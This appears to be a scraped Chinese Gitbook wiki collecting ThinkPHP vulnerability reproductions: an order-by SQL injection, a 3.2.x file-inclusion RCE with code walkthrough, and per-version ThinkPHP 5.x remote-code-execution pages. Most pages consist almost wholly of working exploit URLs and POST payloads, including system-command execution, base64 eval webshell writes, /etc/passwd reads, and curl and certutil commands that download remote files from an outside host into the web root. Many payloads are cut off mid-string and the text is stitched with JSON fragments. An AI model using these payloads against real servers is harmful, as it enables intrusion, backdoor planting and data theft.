ThinkPHP在处理order by排序时，当排序参数可控且为关联数组(key-value)时，由于框架未对数组中key值作安全过滤处理，攻击者可利用key构造SQL语句进行注入，该漏洞影响ThinkPHP 3.2.3、5.1.22及以下版本。 二、漏洞影响 ThinkPHP 3.2.3、5.1.22及以下版本。 三、复现过程 ThinkPHP3.2.3漏洞代码（/Library/Think/Db/Driver.class.php）： ThinkPHP 5.1.22漏洞代码（framework/library/think/db/Query.php）： 从上面漏洞代码可以看出，当$field参数为关联数组（key-value）时，key值拼接到返回值中，SQL语句最终绕过了框架安全过滤得以执行。 ThinkPHP 3.2.3 访问如下URL即可进行漏洞利用： http://www.0-sec.org/ThinkPHP/?order[updatexml(1,concat(0x3a,user()),1)]=1 参考链接 https://mp.weixin.qq.com/s?__biz=MzIwNTcxNTczMQ==&mid=2247483907&idx=1&sn=3c1f9874878c92d10cff30c1c263fa8a&scene=21#wechat_redirect Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:05 "},"Web安全/Thinkphp/Thinkphp 3.x 漏洞/ThinkPHP3.2.x RCE漏洞/ThinkPHP3.2.x RCE漏洞.html":{"url":"Web安全/Thinkphp/Thinkphp 3.x 漏洞/ThinkPHP3.2.x RCE漏洞/ThinkPHP3.2.x RCE漏洞.html","title":"ThinkPHP3.2.x RCE漏洞","keywords":"","body":"ThinkPHP3.2.x RCE漏洞 漏洞描述 该漏洞是在受影响的版本中，业务代码中如果模板赋值方法assign的第一个参数可控，则可导致模板文件路径变量被覆盖为携带攻击代码的文件路径，造成任意文件包含，执行任意代码。 漏洞影响 ThinkPHP3.2.x FOFA title=\"ThinkPHP\" 漏洞复现 ThinkPHP3.2.x_assign方法第一个变量可控=>变量覆盖=>任意文件包含=>RCE 漏洞url： http://x.x.x.x/index.php?m=Home&c=I ndex&a=index&value[_filename]=.\\Application \\Runtime\\Logs\\Home\\21_06_30.log 在ThinkPHP3.2.3框架的程序中，如果要在模板中输出变量，需要在控制器中把变量传递给模板，系统提供assig n方法对模板变量赋值，本漏洞的利用条件为assign方法的第一个变量可控。 下面是漏洞的demo代码： assign($value); $this->display(); } } demo代码说明： 如果需要测试请把demo代码放入对应位置,代码位置：\\Application\\Home\\Controller\\IndexController.class.php 因为程序要进入模板渲染方法方法中，所以需要创建对应的模板文件，内容随意，模板文件位置： \\Application\\Home\\View\\Index\\index.html 这里需要说明，模板渲染方法(display,fetch,show)都可以；这里fetch会有一些区别，因为fetch程序逻辑中会使用ob_start()打开缓冲区，使得PHP代码的数据块和echo()输出都会进入缓冲区而不会立刻输出，所以构造fetch方法对应的攻击代码想要输出的话，需要在攻击代码末尾带上exit()或die(); 漏洞攻击： 测试环境： ThinkPHP3.2.3完整版 Phpstudy2016 PHP-5.6.27 Apache Windows10 debug模式开启或不开启有一点区别，但是都可以。 1.debug模式关闭： 写入攻击代码到日志中。错误请求系统报错： 请求数据包： GET /index.php?m=--> HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-GB,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: PHPSESSID=b6r46ojgc9tvdqpg9efrao7f66; Upgrade-Insecure-Requests: 1 日志文件路径（这里是默认配置的log文件路径，ThinkPHP的日志路径和日期相关）： \\Application\\Runtime\\Logs\\Common\\21_06_30.log 日志文件内容： 构造攻击请求： http://127.0.0.1/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/21_06_30.log 2.debug模式开启： 上面的错误请求日志方式同样可用。另外debug模式开启，正确请求的日志也会被记录的到日志中，但日志路径不一样。 请求数据包： GET /index.php?m=Home&c=Index&a=index&test=--> HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-GB,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: PHPSESSID=b6r46ojgc9tvdqpg9efrao7f66; Upgrade-Insecure-Requests: 1 日志文件路径（这里是默认配置的log文件路径）： \\Application\\Runtime\\Logs\\Home\\21_06_30.log 构造攻击请求：http://127.0.0.1/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/21_06_30.log 3.寻找程序上传入口，上传文件 这种方式最可靠，上传具有恶意代码的任何文件到服务器上，直接包含其文件相对或绝对路径即可。 http://127.0.0.1/index.php?m=Home&c=Index&a=index&value[_filename]=./test.txt 0x03 代码分析 程序执行流程： 1.功能代码中的assign方法中第一个变量为可控变量： 代码位置：\\Application\\Home\\Controller\\IndexController.class.php 2.可控变量进入assign方法赋值给$this→tVar变量： 代码位置：\\ThinkPHP\\Library\\Think\\View.class.php 3.赋值结束后进入display方法中，display方法开始解析并获取模板文件内容，此时模板文件路径和内容为空： 代码位置：\\ThinkPHP\\Library\\Think\\View.class.php 4.程序进入fetch方法中，传入的参数为空，程序会去根据配置获取默认的模板文件位置（./Application/Home/View/Index/index.html）。之后，系统配置的默认模板引擎为think，所以程序进入else分支，获取$this→tVar变量值赋值给$params，之后进入Hook::listen方法中。 代码位置：\\ThinkPHP\\Library\\Think\\View.class.php 5.listen方法处理后，进入exec方法中： 代码位置：\\ThinkPHP\\Library\\Think\\Hook.class.php 6.进入exec方法中，处理后调用Behavior\\ParseTemplateBehavior类中的run方法处理$params这个带有日志文件路径的值。 代码位置：\\ThinkPHP\\Library\\Think\\Hook.class.php 7.程序进入run方法中，一系列判断后，进入else分支，调用Think\\Template类中的fetch方法对变量$_data（为带有日志文件路径的变量值）进行处理。 代码位置：\\ThinkPHP\\Library\\Behavior\\ParseTemplateBehavior.class.php 8.进入Think\\Template类中的fetch方法，获取缓存文件路径后，进入Storage的load方法中。 代码位置：\\ThinkPHP\\Library\\Think\\Template.class.php 9.跟进到Storage的load方法中，$_filename为之前获取的缓存文件路径，$var则为之前带有_filename=日志文件路径的数组，$vars不为空则使用extract方法的EXTR_OVERWRITE默认描述对变量值进行覆盖，之后include该日志文件路径，造成文件包含。 代码位置：\\ThinkPHP\\Library\\Think\\Storage\\Driver\\File.class.php 覆写后： 最终导致： include .\\Application\\Runtime\\Logs\\Home\\21_06_30.log 0x05 ThinkPHP3.2.*各版本之间的差异： 1.ThinkPHP_3.2和ThinkPHP_3.2.1 代码位置：\\ThinkPHP\\Library\\Think\\Storage\\Driver\\File.class.php 第68-79行 /** * 加载文件 * @access public * @param string $filename 文件名 * @param array $vars 传入变量 * @return void */ public function load($filename,$vars=null){ if(!is_null($vars)) extract($vars, EXTR_OVERWRITE); include $filename; } http://x.x.x.x/index.php?m=Home&c=Index&a=index&value[filename]=.\\ 2.ThinkPHP_3.2.2和ThinkPHP_3.2.3 代码位置：\\ThinkPHP\\Library\\Think\\Storage\\Driver\\File.class.php /** * 加载文件 * @access public * @param string $filename 文件名 * @param array $vars 传入变量 * @return void */ public function load($_filename,$vars=null){ if(!is_null($vars)) extract($vars, EXTR_OVERWRITE); include $_filename; } http://127.0.0.1/index.php?m=Home&c=Index&a=index&value[_filename]=.\\ 3.限定条件下参数的收集 很多利用Thinkphp二开的cms，value的值不确定，以下列出常见的： paramnamevaluearrayarrinfolistpagemenusvardatamoudlemodule 最终payload例如： http://127.0.0.1/index.php?m=Home&c=Index&a=index&info[_filename]=.\\ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:05:45 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.1/Thinkphp 5.0.1.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.1/Thinkphp 5.0.1.html","title":"Thinkphp 5.0.1","keywords":"","body":"Thinkphp 5.0.1 一、漏洞简介 二、漏洞影响 三、复现过程 1、判断是否存在漏洞 poc1 http://wwww.com/public s=phpinfo()&_method=__construct&filter=assert _method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo _method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo _method=__construct&method=get&filter[]=call_user_func&get[0]=phpinfo&get[1]=1 poc2 http:/xxxx.com/?s=index/index/index s=ipconfig&_mehthod=__construct$method=&filter[]=system 2、深入利用 使用post提交 1、使用assert函数 s=phpinfo()&_method=__construct&filter=assert 2、include函数，可以根据此函数查看一些文件及其配置 s=include(\"/etc/passwd\")&_method=__construct&filter=assert 3、file_put_contents函数，可以直接写入文件 s=file_put_contents('/data/wwwroot/www.0-sec.org/application/index/test.php',base64_decode('PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4'))&_method=__construct&filter=assert 4、读取文件 _method=__construct&method=get&filter[]=think\\__include_file&server[]=phpinfo&get[]=../application/.htaccess s=include(\"../application/.htaccess\")&_method=__construct&filter=assert //ps:如果不加.. 请加上完整路径 5、var_dump函数，可以查看该路径下的文件，文件夹 s=var_dump(scandir('../application/'))&_method=__construct&filter=assert 6、复制文件 s=copy(\"/data/wwwroot/data.tar\", \"/data/wwwroot/www.0-sec.org/public/data.tar\")&_method=__construct&filter=asser Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:06 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.10/Thinkphp 5.0.10.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.10/Thinkphp 5.0.10.html","title":"Thinkphp 5.0.10","keywords":"","body":"Thinkphp 5.0.10 一、漏洞简介 二、漏洞影响 三、复现过程 post提交 http://www.0-sec.org/public/index.php?s=index/index/index s=whoami&_method=__construct&method&filter[]=syste Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:11 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.11/Thinkphp 5.0.11.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.11/Thinkphp 5.0.11.html","title":"Thinkphp 5.0.11","keywords":"","body":"Thinkphp 5.0.11 一、漏洞简介 二、漏洞影响 三、复现过程 http://www.0-sec.org/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][0]=curl https://www.hack.com/xxx.js -o ./upload/xxx.ph Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:12 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.12/Thinkphp 5.0.12.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.12/Thinkphp 5.0.12.html","title":"Thinkphp 5.0.12","keywords":"","body":"Thinkphp 5.0.12 一、漏洞简介 二、漏洞影响 三、复现过程 www.0-sec.org/?s=index/index post s=whoami&_method=__construct&method=POST&filter[]=system aaaa=whoami&_method=__construct&method=GET&filter[]=system _method=__construct&method=GET&filter[]=system&get[]=whoami c=system&f=calc&_method=filter 写shell POST s=file_put_contents('zerosec.php','Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:13 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.13/Thinkphp 5.0.13.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.13/Thinkphp 5.0.13.html","title":"Thinkphp 5.0.13","keywords":"","body":"Thinkphp 5.0.13 一、漏洞简介 二、漏洞影响 三、复现过程 post提交 www.0-sec.org/?s=index/index s=whoami&_method=__construct&method=POST&filter[]=system aaaa=whoami&_method=__construct&method=GET&filter[]=system _method=__construct&method=GET&filter[]=system&get[]=whoami c=system&f=calc&_method=filter 写shell POST s=file_put_contents('zerosec.php','补充 有captcha路由时无需debug=true http://www.0-sec.org/?s=captcha/calc POST _method=__construct&filter[]=system&method=GET Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:13 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.14/Thinkphp 5.0.14.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.14/Thinkphp 5.0.14.html","title":"Thinkphp 5.0.14","keywords":"","body":"Thinkphp 5.0.14 一、漏洞简介 二、漏洞影响 三、复现过程 1、常规命令 ?s=index/think\\app/invokefunction&function=&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php.jpg&vars[1][]=%3C?php%20phpinfo();?3E 2、eval（\\'\\'）和assert（\\'\\'）被拦截，命令函数被禁止 http://www.xxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo(); http://www.xxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_GET[1])&1=call_user_func_array(\"file_put_contents\",array(\"3.php\",file_get_contents(\"https://www.hack.com/xxx.js\"))); 3、基于php7.2环境下 http://www.xxxx.cn/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=1.txt&vars[1][1]=1 http://www.xxxx.cn/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=index11.php&vars[1][1]= 写进去发现转义了尖括号 4、通过copy函数 http://www.xxxx.cn/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][0]= https://www.hack.com/xxx.js&vars[1][1]=112233.ph Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:14 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.15/Thinkphp 5.0.15.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.15/Thinkphp 5.0.15.html","title":"Thinkphp 5.0.15","keywords":"","body":"Thinkphp 5.0.15 一、漏洞简介 二、漏洞影响 三、复现过程 https://www.0-sec.org/?s=index/index post s=whoami&_method=__construct&method=POST&filter[]=system aaaa=whoami&_method=__construct&method=GET&filter[]=system _method=__construct&method=GET&filter[]=system&get[]=whoami c=system&f=calc&_method=filter 写shell POST s=file_put_contents('zerosec.php',' 有captcha路由时无需debug=true https://www.0-sec.org/?s=captcha/calc POST _method=__construct&filter[]=system&method=GET Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:14 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.16/Thinkphp 5.0.16.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.16/Thinkphp 5.0.16.html","title":"Thinkphp 5.0.16","keywords":"","body":"Thinkphp 5.0.16 一、漏洞简介 二、漏洞影响 三、复现过程 https://www.0-sec.org/?s=index/index post s=whoami&_method=__construct&method=POST&filter[]=system aaaa=whoami&_method=__construct&method=GET&filter[]=system _method=__construct&method=GET&filter[]=system&get[]=whoami c=system&f=calc&_method=filter 写shell POST s=file_put_contents('zerosec.php',' 有captcha路由时无需debug=true https://www.0-sec.org/?s=captcha/calc POST _method=__construct&filter[]=system&method=GET 写shell post s=file_put_contents('/绝对路径/test.php',base64_decode('PD9waHAgJHBhc3M9JF9QT1NUWydhYWFhJ107ZXZhbCgkcGFzcyk7Pz4'))&_method=__construct&filter=assert 密码aaaa 直接菜刀连 http://wwww.0-sec.org/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_POST[1]) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:15 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.17/Thinkphp 5.0.17.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.17/Thinkphp 5.0.17.html","title":"Thinkphp 5.0.17","keywords":"","body":"Thinkphp 5.0.17 一、漏洞简介 二、漏洞影响 三、复现过程 https://www.0-sec.org/?s=index/index POST s=whoami&_method=__construct&method=POST&filter[]=system aaaa=whoami&_method=__construct&method=GET&filter[]=system _method=__construct&method=GET&filter[]=system&get[]=whoami c=system&f=calc&_method=filter 写shell POST s=file_put_contents('zerosec.php',' 有captcha路由时无需debug=true https://www.0-sec.org/?s=captcha/calc POST _method=__construct&filter[]=system&method=GET Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:15 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.18/Thinkphp 5.0.18.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.18/Thinkphp 5.0.18.html","title":"Thinkphp 5.0.18","keywords":"","body":"Thinkphp 5.0.18 一、漏洞简介 二、漏洞影响 三、复现过程 1、windows http://www.xxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=1 http://www.xxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo() 2、使用certutil http://www.xxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=passthru&vars[1][0]=cmd /c certutil -urlcache -split -f https://www.hack.com/xxx.js uploads/1.php 由于根目录没写权限，所 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:16 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.19/Thinkphp 5.0.19.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.19/Thinkphp 5.0.19.html","title":"Thinkphp 5.0.19","keywords":"","body":"Thinkphp 5.0.19 一、漏洞简介 二、漏洞影响 三、复现过程 https://www.0-sec.org/?s=index/index POST s=whoami&_method=__construct&method=POST&filter[]=system aaaa=whoami&_method=__construct&method=GET&filter[]=system _method=__construct&method=GET&filter[]=system&get[]=whoami c=system&f=calc&_method=filter 写shell POST s=file_put_contents('zerosec.php',' 有captcha路由时无需debug=true https://www.0-sec.org/?s=captcha/calc POST _method=__construct&filter[]=system&method=GET Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:17 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.2/Thinkphp 5.0.2.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.2/Thinkphp 5.0.2.html","title":"Thinkphp 5.0.2","keywords":"","body":"Thinkphp 5.0.2 一、漏洞简介 二、漏洞影响 三、复现过程 www.0-sec.org/?s=index/index POST s=whoami&_method=__construct&method=POST&filter[]=system aaaa=whoami&_method=__construct&method=GET&filter[]=system _method=__construct&method=GET&filter[]=system&get[]=whoami getshell POST s=file_put_contents('zerosec.php','Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:07 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.20/Thinkphp 5.0.20.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.20/Thinkphp 5.0.20.html","title":"Thinkphp 5.0.20","keywords":"","body":"Thinkphp 5.0.20 一、漏洞简介 二、漏洞影响 三、复现过程 https://www.0-sec.org/?s=index/index POST s=whoami&_method=__construct&method=POST&filter[]=system aaaa=whoami&_method=__construct&method=GET&filter[]=system _method=__construct&method=GET&filter[]=system&get[]=whoami c=system&f=calc&_method=filter 写shell POST s=file_put_contents('zerosec.php',' 有captcha路由时无需debug=true https://www.0-sec.org/?s=captcha/calc POST _method=__construct&filter[]=system&method=GET Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:17 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.21/Thinkphp 5.0.21.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.21/Thinkphp 5.0.21.html","title":"Thinkphp 5.0.21","keywords":"","body":"Thinkphp 5.0.21 一、漏洞简介 二、漏洞影响 三、复现过程 1、poc http://0-sec.org/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami 2、poc http://0-sec.org/thinkphp_5.0.21/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 3、poc http://0-sec.org/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=system(\"whoami\"); 4、poc http://0-sec.org/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=@eval($_GET['fuck']);&fuck=eval($_POST[ian]) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:18 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.22/Thinkphp 5.0.22.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.22/Thinkphp 5.0.22.html","title":"Thinkphp 5.0.22","keywords":"","body":"Thinkphp 5.0.22 一、漏洞简介 二、漏洞影响 三、复现过程 1、poc http://0-sec.org/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami 2、poc http://0-sec.org/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]= Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:18 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.23/Thinkphp 5.0.23.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.23/Thinkphp 5.0.23.html","title":"Thinkphp 5.0.23","keywords":"","body":"Thinkphp 5.0.23 一、漏洞简介 二、漏洞影响 三、复现过程 POST /index.php?s=captcha HTTP/1.1 Host: yuorip Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 72 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoam Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:19 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.3/Thinkphp 5.0.3.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.3/Thinkphp 5.0.3.html","title":"Thinkphp 5.0.3","keywords":"","body":"Thinkphp 5.0.3 一、漏洞简介 二、漏洞影响 三、复现过程 www.0-sec.org/?s=index/index POST s=whoami&_method=__construct&method=POST&filter[]=system aaaa=whoami&_method=__construct&method=GET&filter[]=system _method=__construct&method=GET&filter[]=system&get[]=whoami getshell POST s=file_put_contents('zerosec.php','Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:08 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.4/Thinkphp 5.0.4.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.4/Thinkphp 5.0.4.html","title":"Thinkphp 5.0.4","keywords":"","body":"Thinkphp 5.0.4 一、漏洞简介 二、漏洞影响 三、复现过程 www.0-sec.org/?s=index/index POST s=whoami&_method=__construct&method=POST&filter[]=system aaaa=whoami&_method=__construct&method=GET&filter[]=system _method=__construct&method=GET&filter[]=system&get[]=whoami getshell POST s=file_put_contents('zerosec.php','Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:08 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.5/Thinkphp 5.0.5.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.5/Thinkphp 5.0.5.html","title":"Thinkphp 5.0.5","keywords":"","body":"Thinkphp 5.0.5 一、漏洞简介 二、漏洞影响 三、复现过程 waf对eval进行了拦截 禁止了assert函数对eval函数后面的括号进行了正则过滤 对file_get_contents函数后面的括号进行了正则过滤 http://www.0-sec.org/?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=2.php&vars[1][1]= Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:09 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.6/Thinkphp 5.0.6.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.6/Thinkphp 5.0.6.html","title":"Thinkphp 5.0.6","keywords":"","body":"Thinkphp 5.0.6 一、漏洞简介 二、漏洞影响 三、复现过程 www.0-sec.org/?s=index/index POST s=whoami&_method=__construct&method=POST&filter[]=system aaaa=whoami&_method=__construct&method=GET&filter[]=system _method=__construct&method=GET&filter[]=system&get[]=whoami getshell POST s=file_put_contents('zerosec.php','Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:09 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.7/Thinkphp 5.0.7.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.7/Thinkphp 5.0.7.html","title":"Thinkphp 5.0.7","keywords":"","body":"Thinkphp 5.0.7 一、漏洞简介 二、漏洞影响 三、复现过程 www.0-sec.org/?s=index/index POST s=whoami&_method=__construct&method=POST&filter[]=system aaaa=whoami&_method=__construct&method=GET&filter[]=system _method=__construct&method=GET&filter[]=system&get[]=whoami getshell POST s=file_put_contents('zerosec.php','Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:10 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.8/Thinkphp 5.0.8.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.8/Thinkphp 5.0.8.html","title":"Thinkphp 5.0.8","keywords":"","body":"Thinkphp 5.0.8 一、漏洞简介 二、漏洞影响 三、复现过程 http://wwww.0-sec.org/public _method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo _method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo _method=__construct&method=get&filter[]=call_user_func&get[0]=phpinfo&get[1]=1 c=system&f=calc&_method=filter 写入文件 http://wwww.0-sec.org/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=uploads/1.php&vars[1][]= 直接用菜刀连 http://wwww.0-sec.org/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_POST[1]) getshell POST s=file_put_contents('zerosec.php','Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:10 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.9/Thinkphp 5.0.9.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.0.9/Thinkphp 5.0.9.html","title":"Thinkphp 5.0.9","keywords":"","body":"Thinkphp 5.0.9 一、漏洞简介 二、漏洞影响 三、复现过程 www.0-sec.org/?s=index/index POST s=whoami&_method=__construct&method=POST&filter[]=system aaaa=whoami&_method=__construct&method=GET&filter[]=system _method=__construct&method=GET&filter[]=system&get[]=whoami c=system&f=calc&_method=filter 写shell POST s=file_put_contents('zerosec.php','Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:11 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.1.18/Thinkphp 5.1.18.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.1.18/Thinkphp 5.1.18.html","title":"Thinkphp 5.1.18","keywords":"","body":"Thinkphp 5.1.18 一、漏洞简介 二、漏洞影响 三、复现过程 1、常规poc http://www.xxxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=index11.php&vars[1][1]= 2、所有目录都无写入权限,base64函数被拦截 http://www.xxxx.com/?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_POST[1] Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:06:20 "},"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.1.29/Thinkphp 5.1.29.html":{"url":"Web安全/Thinkphp/Thinkphp 5.x 命令执行漏洞/Thinkphp 5.1.29/Thinkphp 5.1.29.html","title":"Thinkphp 5.1.29","keywords":"","body":"Thinkphp 5.1.29 一、漏洞简介 二、漏洞影响 三、复现过程 1、代码执行 http://www.0-sec.org/?s=index/\\think\\Request/input&filter=phpinfo&data=1 http://www.0-sec.org/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 http://www.0-sec.org/?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 2、命令执行 http://www.0-sec.org/?s=index/\\think\\Request/input&filter=system&data=操作系统命令 http://www.0-sec.org/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令 http://www.0-sec.org/?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令 3、文件写入 